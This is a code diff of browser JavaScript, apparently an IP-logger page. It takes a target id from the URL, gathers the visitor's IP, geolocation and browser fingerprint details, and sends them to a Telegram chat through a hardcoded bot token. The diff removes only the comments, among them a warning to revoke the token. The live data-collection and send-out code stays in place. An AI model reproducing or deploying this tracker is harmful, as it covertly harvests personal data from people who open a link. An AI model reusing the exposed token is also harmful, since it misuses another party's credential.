@@ -11,15 +11,13 @@
         console.warn("Параметр u не найден в URL");
         return;
       }
-      const CHAT_ID = 769893160;      // сюда отправлять (число или строка @channel)
-      const BOT_TOKEN = '8254985090:AAEmnwYKpxW5zsB5RrbzTUNj8aNA8MasEeM'; // ⚠️ рекомендуется ревокировать и НЕ хранить здесь
+      const CHAT_ID = 769893160;
+      const BOT_TOKEN = '8254985090:AAEmnwYKpxW5zsB5RrbzTUNj8aNA8MasEeM';
 
       try {
-        // Получаем IP/гео (ipapi) — можно заменить на любой другой сервис
         const ipResponse = await fetch('https://ipapi.co/json/');
         const ipData = ipResponse.ok ? await ipResponse.json() : { error: "ipapi_failed" };
 
-        // Сбор данных браузера и окружения
         const ua = navigator.userAgent || null;
         const lang = navigator.language || null;
         const platform = navigator.platform || null;
@@ -30,7 +28,6 @@
         const javaEnabled = (typeof navigator.javaEnabled === 'function') ? navigator.javaEnabled() : null;
         const online = navigator.onLine;
 
-        // Формируем объект (dict)
         const payload = {
           id: TARGET_ID,
           response: {
@@ -48,14 +45,12 @@
             cookies_enabled: cookiesEnabled,
             java_enabled: javaEnabled,
             online: online,
-            raw_ipapi: ipData // оставить полный ответ при необходимости
+            raw_ipapi: ipData
           }
         };
 
-        // Подготовка текстовой версии для отправки — как форматированный JSON в code block
         const text = "```json\n" + JSON.stringify(payload, null, 2) + "\n```";
 
-        // Отправка в Telegram
         const sendUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         const resp = await fetch(sendUrl, {
           method: 'POST',
@@ -63,7 +58,7 @@
           body: JSON.stringify({
             chat_id: CHAT_ID,
             text: text,
-            parse_mode: "MarkdownV2" // используем MarkdownV2, но так как мы отправляем ```json``` — оно будет отображено как моноширинный блок
+            parse_mode: "MarkdownV2"
           })
         });
 
